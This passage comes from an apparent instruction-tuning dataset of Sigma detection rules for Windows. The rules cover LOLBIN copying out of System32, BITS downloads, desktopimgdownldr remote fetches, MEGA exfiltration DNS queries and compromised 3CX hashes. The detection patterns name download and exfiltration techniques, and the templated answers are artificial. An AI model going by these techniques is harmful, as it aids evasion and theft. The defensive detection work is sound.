    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n            - '\\robocopy.exe'\n            - '\\xcopy.exe'\n        - OriginalFileName:\n            - 'robocopy.exe'\n            - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n    condition: 1 of selection* and target\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n            - '\\robocopy.exe'\n            - '\\xcopy.exe'\n        - OriginalFileName:\n            - 'robocopy.exe'\n            - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n    condition: 1 of selection* and target\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n",
      "question": "suspicious copy operation that tries to copy a program from a system (System32 or SysWOW64) directory to another on disk.\nOften used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations\n",
      "answer": "In order to detect a suspicious copy operation that tries to copy a program from a system (System32 or SysWOW64) directory to another on disk, often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations, you should monitor for process creation events in Windows environments, specifically focusing on instances where command-line tools like cmd.exe, PowerShell (powershell.exe or pwsh.exe), robocopy.exe, or xcopy.exe are invoked. These tools should be scrutinized when they include commands indicative of a file copy operation (e.g., \"copy \", \"copy-item\", \"cpi \", \"cp \") especially when the target or destination of the copy involves critical system directories like System32 or SysWOW64. It's important to pay particular attention to the command line used in these operations, recording both the command issued and, if available, the parent command line that initiated the process. However, it's also necessary to be aware of legitimate administrative scripts and direct calls to copying utilities that may trigger false positives, so the context of each detection must be evaluated against known benign activities in the monitored environment. This methodology is designed to uncover tactics and techniques potentially indicative of attempts to evade simple path-based detection mechanisms by relocating system tools to less scrutinized directories."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of the \"net.exe\" command to start a service using the \"start\" flag.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the usage of the \"net.exe\" command to start a service using the \"start\" flag, you should monitor Windows process creation logs for instances where the \"net.exe\" or \"net1.exe\" file is executed. Specifically, look for occurrences where the command line includes the ' start ' sequence, ensuring there's a space character both before and after \"start\". This detail is essential as it differentiates between the use of the command to begin a service versus other potential uses of \"net start\" for discovering services. However, be mindful that such detections may sometimes flag legitimate activities, such as administrators or users starting a service for non-malicious reasons. Given this, the level of concern for these detections is considered low.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n    selection_cli:\n        CommandLine|contains: ' start '     # space character after the 'start' keyword indicates that a service name follows, in contrast to `net start` discovery expression\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administrator or user executes a service for legitimate reasons.\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n    selection_cli:\n        CommandLine|contains: ' start '     # space character after the 'start' keyword indicates that a service name follows, in contrast to `net start` discovery expression\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administrator or user executes a service for legitimate reasons.\nlevel: low\n",
      "question": "usage of the \"net.exe\" command to start a service using the \"start\" flag",
      "answer": "In order to detect the usage of the \"net.exe\" command to start a service using the \"start\" flag, you should monitor Windows process creation logs for instances where the \"net.exe\" or \"net1.exe\" file is executed. Specifically, look for occurrences where the command line includes the ' start ' sequence, ensuring there's a space character both before and after \"start\". This detail is essential as it differentiates between the use of the command to begin a service versus other potential uses of \"net start\" for discovering services. However, be mindful that such detections may sometimes flag legitimate activities, such as administrators or users starting a service for non-malicious reasons. Given this, the level of concern for these detections is considered low."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Rule to detect the Hybrid Connection Manager service installation..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the Hybrid Connection Manager service installation, you should focus on monitoring Windows security logs specifically for the event ID 4697, which is logged when a new service is installed on the system. The service of interest in this context is the \"HybridConnectionManager.\" You should look for instances where both the service name is \"HybridConnectionManager\" and the service file name contains the text \"HybridConnectionManager.\" This event logging is contingent upon having the 'System Security Extension' audit subcategory enabled, as this allows for the logging of such events. Be aware that there might be legitimate uses of the Hybrid Connection Manager, especially in scenarios involving Azure function apps, which can result in false positive alerts. Given the nature of this detection and its specificity in targeting a service installation related to potential cybersecurity threats, the level of alert is considered high. Identifying and monitoring for this specific event involves understanding intrusion tactics, but it directly ties into recognizing potential unauthorized or malicious service installations, which could be indicative of a broader attack campaign or infrastructure compromise.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceName: HybridConnectionManager\n        ServiceFileName|contains: HybridConnectionManager\n    condition: selection\nfalsepositives:\n    - Legitimate use of Hybrid Connection Manager via Azure function apps.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceName: HybridConnectionManager\n        ServiceFileName|contains: HybridConnectionManager\n    condition: selection\nfalsepositives:\n    - Legitimate use of Hybrid Connection Manager via Azure function apps.\nlevel: high\n",
      "question": "Rule to detect the Hybrid Connection Manager service installation.",
      "answer": "In order to detect the Hybrid Connection Manager service installation, you should focus on monitoring Windows security logs specifically for the event ID 4697, which is logged when a new service is installed on the system. The service of interest in this context is the \"HybridConnectionManager.\" You should look for instances where both the service name is \"HybridConnectionManager\" and the service file name contains the text \"HybridConnectionManager.\" This event logging is contingent upon having the 'System Security Extension' audit subcategory enabled, as this allows for the logging of such events. Be aware that there might be legitimate uses of the Hybrid Connection Manager, especially in scenarios involving Azure function apps, which can result in false positive alerts. Given the nature of this detection and its specificity in targeting a service installation related to potential cybersecurity threats, the level of alert is considered high. Identifying and monitoring for this specific event involves understanding intrusion tactics, but it directly ties into recognizing potential unauthorized or malicious service installations, which could be indicative of a broader attack campaign or infrastructure compromise."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect download by BITS jobs via PowerShell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect download by BITS jobs via PowerShell, you should: Monitor the creation of processes on Windows systems. Specifically, focus on instances where either 'powershell.exe' or 'pwsh.exe' are being executed. It is critical to pay attention to the command line used during these executions and look for the presence of the 'Start-BitsTransfer' command. This command is a clear indicator of the Background Intelligent Transfer Service (BITS) being used, potentially to download files in the context of the PowerShell session. Important information such as the name of the computer and the user executing the command should also be logged. Despite the high importance of this monitoring, be aware of potential false positives, as not all usage of 'Start-BitsTransfer' might be malicious.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains: 'Start-BitsTransfer'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains: 'Start-BitsTransfer'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Detect download by BITS jobs via PowerShell",
      "answer": "In order to detect download by BITS jobs via PowerShell, you should: Monitor the creation of processes on Windows systems. Specifically, focus on instances where either 'powershell.exe' or 'pwsh.exe' are being executed. It is critical to pay attention to the command line used during these executions and look for the presence of the 'Start-BitsTransfer' command. This command is a clear indicator of the Background Intelligent Transfer Service (BITS) being used, potentially to download files in the context of the PowerShell session. Important information such as the name of the computer and the user executing the command should also be logged. Despite the high importance of this monitoring, be aware of potential false positives, as not all usage of 'Start-BitsTransfer' might be malicious."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of known compromised version of 3CXDesktopApp.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of known compromised version of 3CXDesktopApp, you should monitor process creation events on Windows systems for specific indicators of compromise. These indicators include a variety of cryptographic hashes representing known malicious versions of the 3CXDesktopApp software. Specifically, look out for process creation events where the hash of the executable matches any in a list that includes both SHA256, SHA1, and MD5 hashes. Additionally, monitor for processes that have filenames, image paths, or product names matching '3CXDesktopApp' or where the file version contains '18.12.', which are indicative of potentially compromised software versions.\n\nBe aware that legitimate usage of the 3CXDesktopApp may sometimes trigger these alerts; thus, it's crucial to validate potential incidents carefully to distinguish between malicious and benign activities. The detection level for these indicators is considered high due to the specificity and potential impact of executing a compromised application version.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_hashes_1:\n        Hashes|contains:\n            # 3CX Desktop 18.12.407\n            - 'SHA256=DDE03348075512796241389DFEA5560C20A3D2A2EAC95C894E7BBED5E85A0ACC'\n            - 'SHA256=54004DFAA48CA5FA91E3304FB99559A2395301C570026450882D6AAD89132A02'\n            - 'SHA256=D45674F941BE3CCA2FBC1AF42778043CC18CD86D95A2ECB9E6F0E212ED4C74AE'\n            - 'SHA1=480DC408EF50BE69EBCF84B95750F7E93A8A1859'\n            - 'SHA1=3B43A5D8B83C637D00D769660D01333E88F5A187'\n            - 'SHA1=6285FFB5F98D35CD98E78D48B63A05AF6E4E4DEA'\n            - 'MD5=BB915073385DD16A846DFA318AFA3C19'\n            - 'MD5=08D79E1FFFA244CC0DC61F7D2036ACA9'\n            - 'MD5=4965EDF659753E3C05D800C6C8A23A7A'\n            # 3CX Desktop 18.12.416\n            - 'SHA256=FAD482DED2E25CE9E1DD3D3ECC3227AF714BDFBBDE04347DBC1B21D6A3670405'\n            - 'SHA256=5D99EFA36F34AA6B43CD81E77544961C5C8D692C96059FEF92C2DF2624550734'\n            - 'SHA256=A60A61BF844BC181D4540C9FAC53203250A982E7C3AD6153869F01E19CC36203'\n            - 'SHA1=E272715737B51C01DC2BED0F0AEE2BF6FEEF25F1'\n            - 'SHA1=8433A94AEDB6380AC8D4610AF643FB0E5220C5CB'\n            - 'SHA1=413D9CBFCBF8D1E8304EAB0AA5484F5EEC5185F5'\n            - 'MD5=9833A4779B69B38E3E51F04E395674C6'\n            - 'MD5=704DB9184700481A56E5100FB56496CE'\n            - 'MD5=8EE6802F085F7A9DF7E0303E65722DC0'\n            # 3CXDesktopApp MSI\n            - 'SHA256=AA124A4B4DF12B34E74EE7F6C683B2EBEC4CE9A8EDCF9BE345823B4FDCF5D868'\n            - 'SHA256=59E1EDF4D82FAE4978E97512B0331B7EB21DD4B838B850BA46794D9C7A2C0983'\n            - 'SHA1=BEA77D1E59CF18DCE22AD9A2FAD52948FD7A9EFA'\n            - 'SHA1=BFECB8CE89A312D2EF4AFC64A63847AE11C6F69E'\n            - 'MD5=F3D4144860CA10BA60F7EF4D176CC736'\n            - 'MD5=0EEB1C0133EB4D571178B2D9D14CE3E9'\n    selection_hashes_2:\n        - sha256:\n            - 'DDE03348075512796241389DFEA5560C20A3D2A2EAC95C894E7BBED5E85A0ACC'\n            - '54004DFAA48CA5FA91E3304FB99559A2395301C570026450882D6AAD89132A02'\n            - 'D45674F941BE3CCA2FBC1AF42778043CC18CD86D95A2ECB9E6F0E212ED4C74AE'\n            - 'FAD482DED2E25CE9E1DD3D3ECC3227AF714BDFBBDE04347DBC1B21D6A3670405'\n            - '5D99EFA36F34AA6B43CD81E77544961C5C8D692C96059FEF92C2DF2624550734'\n            - 'A60A61BF844BC181D4540C9FAC53203250A982E7C3AD6153869F01E19CC36203'\n            - 'AA124A4B4DF12B34E74EE7F6C683B2EBEC4CE9A8EDCF9BE345823B4FDCF5D868'\n            - '59E1EDF4D82FAE4978E97512B0331B7EB21DD4B838B850BA46794D9C7A2C0983'\n        - sha1:\n            - '480DC408EF50BE69EBCF84B95750F7E93A8A1859'\n            - '3B43A5D8B83C637D00D769660D01333E88F5A187'\n            - '6285FFB5F98D35CD98E78D48B63A05AF6E4E4DEA'\n            - 'E272715737B51C01DC2BED0F0AEE2BF6FEEF25F1'\n            - '8433A94AEDB6380AC8D4610AF643FB0E5220C5CB'\n            - '413D9CBFCBF8D1E8304EAB0AA5484F5EEC5185F5'\n            - 'BEA77D1E59CF18DCE22AD9A2FAD52948FD7A9EFA'\n            - 'BFECB8CE89A312D2EF4AFC64A63847AE11C6F69E'\n        - md5:\n            - 'BB915073385DD16A846DFA318AFA3C19'\n            - '08D79E1FFFA244CC0DC61F7D2036ACA9'\n            - '4965EDF659753E3C05D800C6C8A23A7A'\n            - '9833A4779B69B38E3E51F04E395674C6'\n            - '704DB9184700481A56E5100FB56496CE'\n            - '8EE6802F085F7A9DF7E0303E65722DC0'\n            - 'F3D4144860CA10BA60F7EF4D176CC736'\n            - '0EEB1C0133EB4D571178B2D9D14CE3E9'\n    selection_pe_1:\n        - OriginalFileName: '3CXDesktopApp.exe'\n        - Image|endswith: '\\3CXDesktopApp.exe'\n        - Product: '3CX Desktop App'\n    selection_pe_2:\n        FileVersion|contains: '18.12.'\n    condition: all of selection_pe_* or 1 of selection_hashes_*\nfalsepositives:\n    - Legitimate usage of 3CXDesktopApp\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_hashes_1:\n        Hashes|contains:\n            # 3CX Desktop 18.12.407\n            - 'SHA256=DDE03348075512796241389DFEA5560C20A3D2A2EAC95C894E7BBED5E85A0ACC'\n            - 'SHA256=54004DFAA48CA5FA91E3304FB99559A2395301C570026450882D6AAD89132A02'\n            - 'SHA256=D45674F941BE3CCA2FBC1AF42778043CC18CD86D95A2ECB9E6F0E212ED4C74AE'\n            - 'SHA1=480DC408EF50BE69EBCF84B95750F7E93A8A1859'\n            - 'SHA1=3B43A5D8B83C637D00D769660D01333E88F5A187'\n            - 'SHA1=6285FFB5F98D35CD98E78D48B63A05AF6E4E4DEA'\n            - 'MD5=BB915073385DD16A846DFA318AFA3C19'\n            - 'MD5=08D79E1FFFA244CC0DC61F7D2036ACA9'\n            - 'MD5=4965EDF659753E3C05D800C6C8A23A7A'\n            # 3CX Desktop 18.12.416\n            - 'SHA256=FAD482DED2E25CE9E1DD3D3ECC3227AF714BDFBBDE04347DBC1B21D6A3670405'\n            - 'SHA256=5D99EFA36F34AA6B43CD81E77544961C5C8D692C96059FEF92C2DF2624550734'\n            - 'SHA256=A60A61BF844BC181D4540C9FAC53203250A982E7C3AD6153869F01E19CC36203'\n            - 'SHA1=E272715737B51C01DC2BED0F0AEE2BF6FEEF25F1'\n            - 'SHA1=8433A94AEDB6380AC8D4610AF643FB0E5220C5CB'\n            - 'SHA1=413D9CBFCBF8D1E8304EAB0AA5484F5EEC5185F5'\n            - 'MD5=9833A4779B69B38E3E51F04E395674C6'\n            - 'MD5=704DB9184700481A56E5100FB56496CE'\n            - 'MD5=8EE6802F085F7A9DF7E0303E65722DC0'\n            # 3CXDesktopApp MSI\n            - 'SHA256=AA124A4B4DF12B34E74EE7F6C683B2EBEC4CE9A8EDCF9BE345823B4FDCF5D868'\n            - 'SHA256=59E1EDF4D82FAE4978E97512B0331B7EB21DD4B838B850BA46794D9C7A2C0983'\n            - 'SHA1=BEA77D1E59CF18DCE22AD9A2FAD52948FD7A9EFA'\n            - 'SHA1=BFECB8CE89A312D2EF4AFC64A63847AE11C6F69E'\n            - 'MD5=F3D4144860CA10BA60F7EF4D176CC736'\n            - 'MD5=0EEB1C0133EB4D571178B2D9D14CE3E9'\n    selection_hashes_2:\n        - sha256:\n            - 'DDE03348075512796241389DFEA5560C20A3D2A2EAC95C894E7BBED5E85A0ACC'\n            - '54004DFAA48CA5FA91E3304FB99559A2395301C570026450882D6AAD89132A02'\n            - 'D45674F941BE3CCA2FBC1AF42778043CC18CD86D95A2ECB9E6F0E212ED4C74AE'\n            - 'FAD482DED2E25CE9E1DD3D3ECC3227AF714BDFBBDE04347DBC1B21D6A3670405'\n            - '5D99EFA36F34AA6B43CD81E77544961C5C8D692C96059FEF92C2DF2624550734'\n            - 'A60A61BF844BC181D4540C9FAC53203250A982E7C3AD6153869F01E19CC36203'\n            - 'AA124A4B4DF12B34E74EE7F6C683B2EBEC4CE9A8EDCF9BE345823B4FDCF5D868'\n            - '59E1EDF4D82FAE4978E97512B0331B7EB21DD4B838B850BA46794D9C7A2C0983'\n        - sha1:\n            - '480DC408EF50BE69EBCF84B95750F7E93A8A1859'\n            - '3B43A5D8B83C637D00D769660D01333E88F5A187'\n            - '6285FFB5F98D35CD98E78D48B63A05AF6E4E4DEA'\n            - 'E272715737B51C01DC2BED0F0AEE2BF6FEEF25F1'\n            - '8433A94AEDB6380AC8D4610AF643FB0E5220C5CB'\n            - '413D9CBFCBF8D1E8304EAB0AA5484F5EEC5185F5'\n            - 'BEA77D1E59CF18DCE22AD9A2FAD52948FD7A9EFA'\n            - 'BFECB8CE89A312D2EF4AFC64A63847AE11C6F69E'\n        - md5:\n            - 'BB915073385DD16A846DFA318AFA3C19'\n            - '08D79E1FFFA244CC0DC61F7D2036ACA9'\n            - '4965EDF659753E3C05D800C6C8A23A7A'\n            - '9833A4779B69B38E3E51F04E395674C6'\n            - '704DB9184700481A56E5100FB56496CE'\n            - '8EE6802F085F7A9DF7E0303E65722DC0'\n            - 'F3D4144860CA10BA60F7EF4D176CC736'\n            - '0EEB1C0133EB4D571178B2D9D14CE3E9'\n    selection_pe_1:\n        - OriginalFileName: '3CXDesktopApp.exe'\n        - Image|endswith: '\\3CXDesktopApp.exe'\n        - Product: '3CX Desktop App'\n    selection_pe_2:\n        FileVersion|contains: '18.12.'\n    condition: all of selection_pe_* or 1 of selection_hashes_*\nfalsepositives:\n    - Legitimate usage of 3CXDesktopApp\nlevel: high\n",
      "question": "execution of known compromised version of 3CXDesktopApp",
      "answer": "In order to detect execution of known compromised version of 3CXDesktopApp, you should monitor process creation events on Windows systems for specific indicators of compromise. These indicators include a variety of cryptographic hashes representing known malicious versions of the 3CXDesktopApp software. Specifically, look out for process creation events where the hash of the executable matches any in a list that includes both SHA256, SHA1, and MD5 hashes. Additionally, monitor for processes that have filenames, image paths, or product names matching '3CXDesktopApp' or where the file version contains '18.12.', which are indicative of potentially compromised software versions.\n\nBe aware that legitimate usage of the 3CXDesktopApp may sometimes trigger these alerts; thus, it's crucial to validate potential incidents carefully to distinguish between malicious and benign activities. The detection level for these indicators is considered high due to the specificity and potential impact of executing a compromised application version."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of Scheduled Tasks where the program being run is located in a suspicious location or where it is an unusual program to be run from a Scheduled Task.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of Scheduled Tasks where the program being run is located in a suspicious location or where it is an unusual program to be run from a Scheduled Task, you should monitor for specific event IDs and file paths that indicate the creation of a task which triggers the execution of programs not typically associated with scheduled tasks. \n\nFocusing on the Windows Task Scheduler service, especially looking for Event ID 129, which signifies the creation of a task process, is crucial. The detection is more effective if the Task Scheduler's operational logs are enabled, as they are disabled by default. \n\nPay particular attention to tasks that are initiating programs such as Calculator, Command Scripting Utility (CScript), Microsoft HTML Application Host (mshta), Microsoft Paint, Notepad, Microsoft Register Server (regsvr32), and Windows Script Host (wscript). These applications are generally not expected to be launched via scheduled tasks in most secure environments, their usage in such a manner can signify malicious intent, like an attacker seeking to execute code or scripts surreptitiously.\n\nHowever, it's important to note that some legitimate tasks might use these programs. Therefore, an analysis that considers the context in which these applications are used, and possibly excluding known and trusted tasks that use them, is crucial to reduce false positives and focus on genuinely suspicious activity. This nuanced approach is necessary to differentiate between benign and malicious task creations effectively.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: taskscheduler\n    definition: 'Requirements: The \"Microsoft-Windows-TaskScheduler/Operational\" is disabled by default and needs to be enabled in order for this detection to trigger'\ndetection:\n    selection:\n        EventID: 129 # Created Task Process\n        Path|endswith:\n            - '\\calc.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\mspaint.exe'\n            - '\\notepad.exe'\n            - '\\regsvr32.exe'\n            #- '\\rundll32.exe'\n            - '\\wscript.exe'\n    #filter_system:\n    #    Path|endswith: '\\rundll32.exe'\n    #    TaskName|startswith: '\\Microsoft\\Windows\\'\n    #condition: selection and not 1 of filter_*\n    condition: selection\nfalsepositives:\n    - False positives may occur with some of the selected binaries if you have tasks using them (which could be very common in your environment). Exclude all the specific trusted tasks before using this rule\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: taskscheduler\n    definition: 'Requirements: The \"Microsoft-Windows-TaskScheduler/Operational\" is disabled by default and needs to be enabled in order for this detection to trigger'\ndetection:\n    selection:\n        EventID: 129 # Created Task Process\n        Path|endswith:\n            - '\\calc.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\mspaint.exe'\n            - '\\notepad.exe'\n            - '\\regsvr32.exe'\n            #- '\\rundll32.exe'\n            - '\\wscript.exe'\n    #filter_system:\n    #    Path|endswith: '\\rundll32.exe'\n    #    TaskName|startswith: '\\Microsoft\\Windows\\'\n    #condition: selection and not 1 of filter_*\n    condition: selection\nfalsepositives:\n    - False positives may occur with some of the selected binaries if you have tasks using them (which could be very common in your environment). Exclude all the specific trusted tasks before using this rule\nlevel: medium\n",
      "question": "execution of Scheduled Tasks where the program being run is located in a suspicious location or where it is an unusual program to be run from a Scheduled Task",
      "answer": "In order to detect the execution of Scheduled Tasks where the program being run is located in a suspicious location or where it is an unusual program to be run from a Scheduled Task, you should monitor for specific event IDs and file paths that indicate the creation of a task which triggers the execution of programs not typically associated with scheduled tasks. \n\nFocusing on the Windows Task Scheduler service, especially looking for Event ID 129, which signifies the creation of a task process, is crucial. The detection is more effective if the Task Scheduler's operational logs are enabled, as they are disabled by default. \n\nPay particular attention to tasks that are initiating programs such as Calculator, Command Scripting Utility (CScript), Microsoft HTML Application Host (mshta), Microsoft Paint, Notepad, Microsoft Register Server (regsvr32), and Windows Script Host (wscript). These applications are generally not expected to be launched via scheduled tasks in most secure environments, their usage in such a manner can signify malicious intent, like an attacker seeking to execute code or scripts surreptitiously.\n\nHowever, it's important to note that some legitimate tasks might use these programs. Therefore, an analysis that considers the context in which these applications are used, and possibly excluding known and trusted tasks that use them, is crucial to reduce false positives and focus on genuinely suspicious activity. This nuanced approach is necessary to differentiate between benign and malicious task creations effectively."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting DNS queries for subdomains used for upload to MEGA.io.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect DNS queries for subdomains used for upload to MEGA.io, you should focus on monitoring Windows DNS client activities. Specifically, keep an eye on Microsoft-Windows-DNS Client Events/Operational Event Log, making sure it is enabled and collected. The critical piece of information to look out for is Event ID 3008, especially when it's associated with queries containing the domain 'userstorage.mega.co.nz'. This activity might indicate an attempt to use the MEGA.io service potentially for exfiltrating sensitive data. However, it is crucial to remember that there could be legitimate reasons for accessing MEGA, and such interactions might not always signify malicious intent. Nonetheless, given that this activity is flagged with a high level of concern, it's vital to investigate and contextualize any such occurrences to determine their nature accurately. This detection strategy aligns with understanding tactics and techniques related to initial access, command and control, and exfiltration.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: dns-client\n    definition: 'Requirements: Microsoft-Windows-DNS Client Events/Operational Event Log must be enabled/collected in order to receive the events.'\ndetection:\n    selection:\n        EventID: 3008\n        QueryName|contains: 'userstorage.mega.co.nz'\n    condition: selection\nfalsepositives:\n    - Legitimate DNS queries and usage of Mega\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: dns-client\n    definition: 'Requirements: Microsoft-Windows-DNS Client Events/Operational Event Log must be enabled/collected in order to receive the events.'\ndetection:\n    selection:\n        EventID: 3008\n        QueryName|contains: 'userstorage.mega.co.nz'\n    condition: selection\nfalsepositives:\n    - Legitimate DNS queries and usage of Mega\nlevel: high\n",
      "question": "DNS queries for subdomains used for upload to MEGA.io",
      "answer": "In order to detect DNS queries for subdomains used for upload to MEGA.io, you should focus on monitoring Windows DNS client activities. Specifically, keep an eye on Microsoft-Windows-DNS Client Events/Operational Event Log, making sure it is enabled and collected. The critical piece of information to look out for is Event ID 3008, especially when it's associated with queries containing the domain 'userstorage.mega.co.nz'. This activity might indicate an attempt to use the MEGA.io service potentially for exfiltrating sensitive data. However, it is crucial to remember that there could be legitimate reasons for accessing MEGA, and such interactions might not always signify malicious intent. Nonetheless, given that this activity is flagged with a high level of concern, it's vital to investigate and contextualize any such occurrences to determine their nature accurately. This detection strategy aligns with understanding tactics and techniques related to initial access, command and control, and exfiltration."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting desktopimgdownldr utility being used to download a remote file. An adversary may use desktopimgdownldr to download arbitrary files as an alternative to certutil..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the desktopimgdownldr utility being used to download a remote file, an alternative method to certutil employed by adversaries, you should: focus on monitoring process creation events on Windows systems. Specifically, watch for instances where the process name ends with '\\desktopimgdownldr.exe', indicating the desktopimgdownldr utility is being initiated. Additionally, pay attention to when this utility is called by itself as a parent process, which might indicate a recursive or self-initiating action often seen in malicious activities. Crucially, look for command lines containing '/lockscreenurl:http', signaling an attempt to download files from a remote HTTP source. This behavior could be an indicator of misuse of the desktopimgdownldr utility for malicious downloads, akin to how certutil might be abused. However, be aware that there might be unknown false positives, and this monitoring is rated at a medium level of importance.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\desktopimgdownldr.exe'\n        ParentImage|endswith: '\\desktopimgdownldr.exe'\n        CommandLine|contains: '/lockscreenurl:http'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\desktopimgdownldr.exe'\n        ParentImage|endswith: '\\desktopimgdownldr.exe'\n        CommandLine|contains: '/lockscreenurl:http'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "desktopimgdownldr utility being used to download a remote file. An adversary may use desktopimgdownldr to download arbitrary files as an alternative to certutil.",
      "answer": "In order to detect the desktopimgdownldr utility being used to download a remote file, an alternative method to certutil employed by adversaries, you should: focus on monitoring process creation events on Windows systems. Specifically, watch for instances where the process name ends with '\\desktopimgdownldr.exe', indicating the desktopimgdownldr utility is being initiated. Additionally, pay attention to when this utility is called by itself as a parent process, which might indicate a recursive or self-initiating action often seen in malicious activities. Crucially, look for command lines containing '/lockscreenurl:http', signaling an attempt to download files from a remote HTTP source. This behavior could be an indicator of misuse of the desktopimgdownldr utility for malicious downloads, akin to how certutil might be abused. However, be aware that there might be unknown false positives, and this monitoring is rated at a medium level of importance."
    }
  },
  {
